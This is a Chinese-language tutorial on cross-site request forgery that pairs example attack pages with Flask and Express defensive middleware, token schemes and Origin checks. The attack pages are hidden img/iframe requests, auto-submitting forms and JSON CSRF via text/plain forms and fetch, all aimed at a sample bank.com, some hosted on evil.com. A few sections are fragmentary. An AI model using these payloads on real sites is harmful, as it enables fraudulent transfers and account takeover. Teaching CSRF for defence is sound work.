CSRF 跨站请求伪造完全指南

HIGH CSRF (Cross-Site Request Forgery) 又称 "One-Click Attack" 或 "Session Riding"，攻击者诱导已认证用户的浏览器向目标网站发送非预期的请求，从而在用户不知情的情况下以用户身份执行操作。

CSRF 的本质

CSRF 的本质是：浏览器在发送跨站请求时会自动附带目标站点的 Cookie。攻击者无法读取响应（受同源策略保护），但请求本身已经以受害者身份发出并被服务器执行。这是一种 "write-only" 攻击 —— 攻击者只需要请求被执行，不需要获取响应。

1. CSRF 攻击原理

1.1 攻击前提条件

CSRF 攻击成功需要同时满足以下所有条件：

条件说明重要性
用户已认证用户已登录目标网站，浏览器持有有效 Session Cookie必需
可预测的请求目标操作的请求参数完全可预测（无随机 Token 等不可预测值）必需
基于 Cookie 认证服务器仅依赖 Cookie 来验证用户身份，无其他校验必需
诱导用户访问攻击者能让受害者访问恶意页面（钓鱼邮件、论坛帖子、广告等）必需

关键理解：为什么同源策略没有阻止 CSRF？

很多人误以为"同源策略能防止 CSRF"。实际上：

  • 同源策略阻止的是跨域读取响应（evil.com 的 JS 不能读取 bank.com 的响应）
  • 同源策略不阻止跨域发送请求（<form>、<img>、<iframe> 都可以跨域发请求）
  • CSRF 攻击者不需要读取响应 —— 只需要请求被发送并执行即可

2.3 XSS 与 CSRF 的关联

XSS 是 CSRF 防御的天敌

如果目标网站存在 XSS 漏洞，攻击者可以：

  • 通过 XSS 读取页面中嵌入的 CSRF Token
  • 构造包含正确 Token 的请求，绕过所有 CSRF 防御
  • 甚至不需要 CSRF —— XSS 本身就能直接发送同源请求

结论：修复所有 XSS 漏洞是 CSRF 防御的前提条件。XSS 是 CSRF 的超集。

3. CSRF 攻击实例

3.1 GET 型 CSRF（img 标签触发）

最简单的 CSRF 形式。当目标网站用 GET 请求执行敏感操作时（违反 HTTP 规范），攻击极为容易：

存在漏洞的服务端代码：

# 错误示范：使用 GET 执行转账操作（违反 RESTful 设计原则）
@app.route('/transfer', methods=['GET'])
def transfer():
    to_account = request.args.get('to')
    amount = request.args.get('amount')
    # 仅通过 Cookie 中的 session 验证用户身份
    user = get_user_from_session(request.cookies.get('session'))
    if user:
        execute_transfer(user, to_account, amount)
        return "转账成功"

攻击者的恶意页面（多种触发方式）：

<!-- evil.com/attack.html -->
<h1>恭喜你中奖了！点击查看详情</h1>

<!-- 方法1：img 标签（最隐蔽，0像素不可见，用户完全无感知） -->
<img src="https://bank.com/transfer?to=attacker&amount=100000"
     width="0" height="0" style="display:none">

<!-- 方法2：CSS background-image -->
<div style="background:url('https://bank.com/transfer?to=attacker&amount=50000')">
</div>

<!-- 方法3：script 标签 -->
<script src="https://bank.com/transfer?to=attacker&amount=50000"></script>

<!-- 方法4：link 标签 -->
<link rel="stylesheet" href="https://bank.com/transfer?to=attacker&amount=50000">

<!-- 方法5：隐藏 iframe -->
<iframe src="https://bank.com/transfer?to=attacker&amount=50000"
        width="0" height="0" frameborder="0"></iframe>

<!-- 方法6：多个操作同时执行 -->
<img src="https://bank.com/transfer?to=attacker&amount=50000">
<img src="https://bank.com/user/email?new=attacker@evil.com">
<img src="https://bank.com/user/password?new=hacked123">
GET CSRF 的特殊危险性
  • HTML 邮件：可以嵌入 <img> 标签，邮件客户端加载图片时就触发攻击
  • 论坛/评论区：允许 <img> 的 BBCode 或 Markdown 中嵌入恶意 URL
  • 无需 JavaScript：纯 HTML 即可完成，绕过 NoScript 等插件
  • 极难检测：服务器日志中看到的是正常的 GET 请求

设计原则：永远不要用 GET 请求执行状态修改操作！GET 应该是安全的、幂等的。

3.2 POST 型 CSRF（隐藏表单自动提交）

大多数敏感操作使用 POST 方法，但这并不能阻止 CSRF 攻击。攻击者使用隐藏表单 + JavaScript 自动提交：

目标请求：

POST /transfer HTTP/1.1
Host: bank.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

to=alice&amount=10000

基本攻击页面：

<!-- evil.com/csrf-post.html -->
<html>
<body onload="document.getElementById('csrf-form').submit();">
  <h1>页面加载中，请稍候...</h1>

  <!-- 隐藏的自动提交表单 -->
  <form id="csrf-form"
        action="https://bank.com/transfer"
        method="POST"
        style="display:none">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="100000">
    <input type="hidden" name="memo" value="正常转账">
  </form>
</body>
</html>

进阶版 —— 在 iframe 中静默提交（用户完全无感知）：

<!-- evil.com/stealth-csrf.html -->
<html>
<body>
  <h1>精彩内容，请欣赏...</h1>

  <!-- 表单提交到隐藏 iframe，不会造成页面跳转 -->
  <iframe name="csrf-frame" style="display:none"></iframe>

  <form id="csrf-form"
        action="https://bank.com/transfer"
        method="POST"
        target="csrf-frame">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="100000">
  </form>

  <script>
    // 自动提交
    document.getElementById('csrf-form').submit();

    // 可选：延迟后跳转正常页面，掩盖攻击痕迹
    setTimeout(function() {
      window.location = 'https://www.google.com';
    }, 3000);
  </script>
</body>
</html>

多步骤 CSRF（模拟复杂操作流程）：

<script>
// 多步骤攻击：先修改邮箱，再触发密码重置

  document.body.appendChild(frame1);

</script>

3.3 JSON CSRF

现代 RESTful API 通常使用 JSON 格式。JSON CSRF 的难度更大，但在特定条件下仍可实现：

目标 API 请求：

POST /api/transfer HTTP/1.1
Host: bank.com
Content-Type: application/json
Cookie: session=abc123

{"to": "alice", "amount": 10000}

攻击方式1：利用 form enctype=text/plain（最常用）

<!--
  HTML 表单 enctype="text/plain" 发送的请求体格式为: name=value
  利用这个特性构造合法的 JSON
-->
<form action="https://bank.com/api/transfer"
      method="POST"
      enctype="text/plain">
  <input type="hidden"
         name='{"to":"attacker","amount":100000,"padding":"'
         value='whatever"}'>
</form>

<!--
  发送的请求体为:
  {"to":"attacker","amount":100000,"padding":"=whatever"}

  注意: 浏览器自动在 name 和 value 之间插入 = 号
  如果服务端 JSON 解析器忽略未知字段，攻击成功

  Content-Type 将会是 text/plain（非 application/json）
  → 如果服务端不严格检查 Content-Type，则攻击有效
-->

<script>document.forms[0].submit();</script>

攻击方式2：利用 fetch API（需要宽松 CORS 或不检查 Content-Type）

<script>
// 方式 A: 使用 text/plain 避免 CORS Preflight
// Content-Type 为 text/plain 是"简单请求"，不触发预检
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',  // 携带 Cookie
  headers: {
    'Content-Type': 'text/plain'  // 不会触发 CORS Preflight
  },
  body: JSON.stringify({to: 'attacker', amount: 100000})
});

// 方式 B: 如果目标有宽松的 CORS 配置（如 Access-Control-Allow-Origin: *）
fetch('https://bank.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'  // 触发 Preflight，需要 CORS 允许
  },
  body: JSON.stringify({to: 'attacker', amount: 100000})
});
</script>
JSON CSRF 的条件和限制
场景是否可攻击原因
服务端不检查 Content-Type✅ 可攻击text/plain 的 JSON body 也被接受
服务端接受 text/plain✅ 可攻击简单请求不触发 Preflight
CORS: Allow-Origin: *⚠️ 部分* 不允许 credentials，但某些配置错误可利用
CORS 动态反射 Origin✅ 可攻击任何 Origin 都被允许
严格 Content-Type + 无 CORS❌ 不可攻击Preflight 被拒绝

4. CSRF Token 防御机制

4.1 Synchronizer Token Pattern（同步令牌模式）

最经典、最可靠的 CSRF 防御方案。核心思想是在请求中包含一个攻击者无法预测的随机值：

4.4 Signed Double Submit Cookie（签名双重提交）

为解决普通 Double Submit 的子域名覆盖问题，对 Token 进行 HMAC 签名：

import hmac
import hashlib
import secrets

SERVER_SECRET = 'your-secret-key-never-expose'

def generate_signed_token(session_id):
    """
    生成签名 Token:
    token = nonce + "." + HMAC(server_secret, nonce + session_id)
    即使攻击者覆盖 Cookie 中的值，也无法伪造有效签名
    """
    nonce = secrets.token_hex(16)
    message = f"{nonce}{session_id}".encode()
    signature = hmac.new(SERVER_SECRET.encode(), message, hashlib.sha256).hexdigest()
    return f"{nonce}.{signature}"

def validate_signed_token(token, session_id):
    """验证签名 Token"""
    try:
        nonce, signature = token.split('.')
        message = f"{nonce}{session_id}".encode()
        expected = hmac.new(SERVER_SECRET.encode(), message, hashlib.sha256).hexdigest()
        return hmac.compare_digest(signature, expected)
    except (ValueError, AttributeError):
        return False

5.1 SameSite 属性详解

SameSite 是 Cookie 的安全属性，告诉浏览器在跨站请求时是否应该发送该 Cookie：

SameSite 值行为描述CSRF 防护效果用户体验影响
Strict任何跨站请求都不发送 Cookie

5.4 SameSite 的局限性

SameSite 不是银弹 —— 已知局限
  • Lax 不防 GET CSRF：如果应用有 GET 请求执行状态修改（如 /delete?id=1），链接跳转仍携带 Cookie
  • Same-Site ≠ Same-Origin：sub.example.com 和 www.example.com 是同站（Same-Site），子域 XSS 可绕过
  • Chrome 2 分钟窗口：新设置的 Lax Cookie 在前 2 分钟允许跨站 POST（为兼容 SSO/OAuth 流程）
  • 旧浏览器不支持：IE、旧版 Safari 等可能忽略 SameSite 属性
  • 第三方嵌入受影响：Strict/Lax 会破坏需要跨站 Cookie 的功能（如嵌入式支付、SSO）
浏览器默认行为变更（重要）

自 Chrome 80 (2020年2月) 起：

  • 未设置 SameSite 的 Cookie 默认按 SameSite=Lax 处理
  • SameSite=None 必须同时设置 Secure 属性
  • 这意味着大多数简单 CSRF（POST form / img / iframe）在现代浏览器中已被默认阻止
  • Firefox 69+、Edge 80+ 也跟进了此策略

6. Referer / Origin Header 检查

6.1 原理

浏览器在发送请求时会自动附带 Origin 和/或 Referer 头，标明请求的来源。服务端可以检查这些头部来识别跨站请求：

# 正常请求（来自 bank.com 自身页面）:
POST /transfer HTTP/1.1
Host: bank.com
Origin: https://bank.com               ← 来自自己
Referer: https://bank.com/transfer.html
Cookie: session=abc123

# CSRF 请求（来自攻击者页面）:
POST /transfer HTTP/1.1
Host: bank.com
Origin: https://evil.com               ← 来自恶意网站！
Referer: https://evil.com/attack.html
Cookie: session=abc123

from urllib.parse import urlparse

ALLOWED_ORIGINS = {
    'https://bank.com',
    'https://www.bank.com',
    'https://app.bank.com',
}

def validate_request_origin(request):
    """
    验证请求来源（Origin/Referer）
    返回 True 表示来源合法，False 表示可疑
    """
    # 安全方法不需要检查
    if request.method in ('GET', 'HEAD', 'OPTIONS'):
        return True

    # 优先检查 Origin header（更可靠）
    origin = request.headers.get('Origin')
    if origin:
        if origin in ALLOWED_ORIGINS:
            return True
        else:
            log_warning(f"Blocked request with invalid Origin: {origin}")
            return False

    # Origin 缺失时，检查 Referer
    referer = request.headers.get('Referer')
    if referer:
        try:
            parsed = urlparse(referer)
            referer_origin = f"{parsed.scheme}://{parsed.netloc}"
            if referer_origin in ALLOWED_ORIGINS:
                return True
            else:
                log_warning(f"Blocked request with invalid Referer: {referer}")
                return False
        except Exception:
            return False

    # Origin 和 Referer 都缺失
    # 严格策略：拒绝（推荐）
    # 宽松策略：放行（不推荐，攻击者可利用）
    log_warning("Request missing both Origin and Referer headers")
    return False  # 严格模式：默认拒绝

for sub in subdomains:

    'TOKEN_LENGTH': 32,            # Token 字节长度
    'HEADER_NAME': 'X-CSRF-Token', # 自定义 Header 名
    'FIELD_NAME': 'csrf_token',    # 表单字段名
    'SAFE_METHODS': frozenset(['GET', 'HEAD', 'OPTIONS', 'TRACE']),

# ============================================================
# CSRF Token 核心逻辑
# ============================================================

def generate_csrf_token():
    """生成与当前 Session 绑定的 CSRF Token"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(CSRF_CONFIG['TOKEN_LENGTH'])
    return session['csrf_token']

def validate_csrf_token(token):
    """
    验证 CSRF Token
    使用时间恒定比较防止 Timing Attack
    """
    expected = session.get('csrf_token', '')
    if not expected or not token:
        return False
    # hmac.compare_digest 是时间恒定的比较函数
    return hmac.compare_digest(token, expected)

# ============================================================
# Origin/Referer 验证
# ============================================================

def validate_origin():
    """验证请求来源（作为额外防护层）"""
    origin = request.headers.get('Origin')
    if origin:
        if origin not in CSRF_CONFIG['ALLOWED_ORIGINS']:
            logger.warning(f"Invalid Origin: {origin} for {request.path}")
            return False
        return True

    # Origin 缺失时检查 Referer
    referer = request.headers.get('Referer')
    if referer:
        try:
            parsed = urlparse(referer)
            referer_origin = f"{parsed.scheme}://{parsed.netloc}"
            if referer_origin not in CSRF_CONFIG['ALLOWED_ORIGINS']:
                logger.warning(f"Invalid Referer: {referer} for {request.path}")
                return False
            return True
        except Exception:
            return False

    # 两者都缺失 —— 记录但不拒绝（由 CSRF Token 兜底）
    logger.info(f"Missing Origin/Referer for {request.method} {request.path}")
    return True  # 依赖 CSRF Token 作为主要防御

# ============================================================
# CSRF 中间件
# ============================================================

@app.before_request
def csrf_protect():
    """全局 CSRF 保护中间件"""
    # 安全方法不需要 CSRF 验证
    if request.method in CSRF_CONFIG['SAFE_METHODS']:
        return

    # 豁免路径（如 Webhook 回调，这些请求使用签名验证）
    if any(request.path.startswith(p) for p in CSRF_CONFIG['EXEMPT_PATHS']):
        return

    # 第一层：Origin/Referer 验证
    if not validate_origin():
        abort(403, description="Request origin not allowed")

    # 第二层：CSRF Token 验证（核心防线）
    token = (
        request.form.get(CSRF_CONFIG['FIELD_NAME'])       # 表单字段
        or request.headers.get(CSRF_CONFIG['HEADER_NAME']) # 自定义 Header
        or request.headers.get('X-XSRF-Token')            # Angular 风格
    )

    if not validate_csrf_token(token):
        logger.warning(
            f"CSRF validation failed: {request.method} {request.path} "
            f"IP={request.remote_addr} "
            f"Origin={request.headers.get('Origin', 'N/A')} "
            f"UA={request.headers.get('User-Agent', 'N/A')[:100]}"
        )
        abort(403, description="CSRF token validation failed")

# ============================================================

// CSRF Token 核心模块

class CSRFProtection {
  /**
   * 生成 CSRF Token 并存入 Session
   */
  static generateToken(req) {
    if (!req.session.csrfToken) {
      req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    }
    return req.session.csrfToken;
  }

  /**
   * 时间恒定比较（防 Timing Attack）
   */
  static safeCompare(a, b) {
    if (!a || !b) return false;
    if (a.length !== b.length) return false;
    try {
      return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
    } catch {
      return false;
    }
  }

  /**
   * 从请求中提取客户端提交的 Token
   */
  static extractToken(req) {
    return (
      req.headers[CONFIG.TOKEN_HEADER] ||    // 自定义 Header（推荐）
      req.body?.[CONFIG.TOKEN_FIELD] ||      // 表单字段
      req.headers['x-xsrf-token'] ||         // Angular 风格
      null
    );
  }

  /**
   * 验证 Token
   */
  static validateToken(req, clientToken) {
    const serverToken = req.session?.csrfToken;
    return this.safeCompare(clientToken, serverToken);
  }
}

function originCheckMiddleware(req, res, next) {
  if (CONFIG.SAFE_METHODS.has(req.method)) return next();

    if (!CONFIG.ALLOWED_ORIGINS.includes(origin)) {

      return res.status(403).json({
        error: 'ORIGIN_NOT_ALLOWED',
        message: 'Request origin is not in the allowed list'
      });

  // Origin 缺失时依赖 CSRF Token 验证
  next();
}

// ============================================================

function csrfMiddleware(req, res, next) {
  // 生成 Token 并提供给路由/模板使用
  const token = CSRFProtection.generateToken(req);
  req.csrfToken = () => token;
  res.locals.csrfToken = token;

  // 设置 Double Submit Cookie（供前端 JS 读取）
  res.cookie(CONFIG.TOKEN_COOKIE, token, {
    httpOnly: false,   // 前端 JS 需要读取！
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/'
  });

  // 安全方法不需要验证
  if (CONFIG.SAFE_METHODS.has(req.method)) return next();

  // 豁免路径（使用其他验证方式，如 Webhook Signature）
  if (CONFIG.EXEMPT_PATHS.some(p => req.path.startsWith(p))) return next();

  // 验证 Token
  const clientToken = CSRFProtection.extractToken(req);
  if (!CSRFProtection.validateToken(req, clientToken)) {
    console.warn(`[CSRF] Validation failed: ${req.method} ${req.path}`, {
      ip: req.ip,
      origin: req.headers.origin || 'N/A',
      referer: req.headers.referer || 'N/A',
      userAgent: (req.headers['user-agent'] || '').substring(0, 100)
    });

    return res.status(403).json({
      error: 'CSRF_TOKEN_INVALID',
      message: 'CSRF token validation failed. Please refresh the page and try again.'
    });
  }

  next();
}

8.4 最佳实践：纵深防御体系

推荐的 CSRF 纵深防御策略

不依赖单一防御措施，多层防护相互补充：

  1. 第一层 - 浏览器级：SameSite=Lax Cookie（零成本，默认开启）
  2. 第二层 - 应用级：CSRF Token（核心防线，Synchronizer 或 Signed Double Submit）
  3. 第三层 - HTTP 级：Origin/Referer Header 验证（额外保障）
  4. 第四层 - 业务级：关键操作二次确认（密码验证/短信验证码/人脸识别）

前提条件：修复所有 XSS 漏洞 —— XSS 可以击败上述所有 CSRF 防御！

设计原则：

  • GET 请求永远不执行状态修改操作
  • 所有状态修改请求使用 POST/PUT/DELETE
  • Cookie 设置 Secure + HttpOnly + SameSite
  • 定期审计子域名，防止 Subdomain Takeover
